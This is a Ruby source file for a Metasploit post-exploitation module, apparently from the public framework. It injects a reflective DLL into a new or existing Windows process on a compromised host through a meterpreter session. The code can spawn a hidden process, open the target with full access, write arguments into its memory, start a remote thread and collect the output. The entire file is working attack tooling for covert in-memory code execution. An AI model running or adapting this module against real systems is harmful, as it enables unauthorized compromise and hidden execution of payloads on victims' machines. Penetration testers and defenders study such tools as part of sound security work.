##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/reflective_dll_injection'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Windows Manage Reflective DLL Injection
      Module with arguments',
      'Description' => '
      This module will inject a specified reflective DLL
      into the memory of a process, new or existing,
      passing any arguments.
      ',
      'License' => MSF_LICENSE,
      'Author' => 'Ben Campbell,b4rtik',
      'Platform' => 'win',
      'SessionTypes' => ['meterpreter'],
      'References'   =>
      [
        [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ]
      ]))
    register_options(
      [
        OptPath.new('PATH', [true, 'Reflective DLL to inject into memory of a process.']),
        OptInt.new('PID', [false, 'Pid  to inject', 0]),
        OptString.new('PROCESS', [false, 'Process to spawn','notepad.exe']),
        OptString.new('ARGUMENTS', [false, 'Command line arguments']),
        OptInt.new('WAIT', [false, 'Time in seconds to wait.', 0])
      ], self.class
    )

    register_advanced_options(
      [
        OptBool.new('KILL',   [ true, 'Kill the injected process at the end of the task.', false ])
      ]
    )
  end

  def run
    dll_path = gen_dll_path
    if File.file?(dll_path)
      run_dll(dll_path)
    else
      print_bad("Dll not found #{dll_path}")
    end
  end

  def gen_dll_path
    dll_path = ::File.expand_path(datastore['PATH'])
    dll_path
  end

  def sanitize_process_name(process_name)
    if process_name.split(//).last(4).join.eql? '.exe'
      process_name
    else
      process_name + '.exe'
    end
  end

  def pid_exists(pid)
    mypid = client.sys.process.getpid.to_i

    if pid == mypid
      print_bad("Invalid PID")
      return false
    end

    host_processes = client.sys.process.get_processes
    if host_processes.length < 1
      print_bad("No running processes found on the target host.")
      return false
    end

    theprocess = host_processes.find {|x| x["pid"] == pid}

    if ( theprocess.nil? )
      return false
    else
      return true
    end

  end

  def launch_process
    process_name = sanitize_process_name(datastore['PROCESS'])
    print_status("Launching #{process_name} ...")
    channelized = datastore['WAIT'] != 0

    process = client.sys.process.execute(process_name, nil,
      'Channelized' => channelized,'Hidden' => true)

    hprocess = client.sys.process.open(process.pid, PROCESS_ALL_ACCESS)
    print_good("Process #{hprocess.pid} created.")
    [process, hprocess]
  end

  def inject_dll(process,dll_path)
    library_path = ::File.expand_path(dll_path)
    exploit_mem, offset = inject_dll_into_process(process, library_path)
    [exploit_mem, offset]
  end

  def open_process
    pid = datastore['PID'].to_i
    if not pid_exists(pid)
      print_bad("Pid not found")
      [nil, nil]
    else
      print_status('Warning: output unavailable')
      print_status("Opening handle to process #{datastore['PID']} ...")
      hprocess = client.sys.process.open(datastore['PID'], PROCESS_ALL_ACCESS)
      print_good("Handle opened")
      [nil, hprocess]
    end
  end

  def run_dll(dll_path)
    print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
    if datastore['PID'] <= 0
      process, hprocess = launch_process
    else
      process, hprocess = open_process
    end

    if hprocess.nil?
      print_bad("Execution finished")
      return
    end

    exploit_mem, offset = inject_dll(hprocess,dll_path)

    if datastore['ARGUMENTS'].nil?
      arg_mem = nil
    else
      arg_mem = copy_args(hprocess)
    end

    print_status('Executing...')
    hprocess.thread.create(exploit_mem + offset, arg_mem)

    if datastore['WAIT'] != 0
      sleep(datastore['WAIT'])
    end

    if datastore['PID'] <= 0
      read_output(process)
    end

    if datastore['KILL'] == true
      print_good("Killing process #{hprocess.pid}")
      hprocess.kill(hprocess.pid)
    end

    print_good('Execution finished.')
  end

  def copy_args(process)
    argssize = datastore['ARGUMENTS'].size + 1
    arg_mem = process.memory.allocate(argssize, PAGE_READWRITE)

    params = datastore['ARGUMENTS']
    params += "\x00"

    process.memory.write(arg_mem, params)
    arg_mem
  end

  def read_output(process)
    print_status('Start reading output')
    begin
      loop do
        output = process.channel.read
        output.split("\n").each { |x| print_good(x) }
        break if output.length == 0
      end
    rescue ::Exception => e

    end

    print_status('End output.')
  end
end
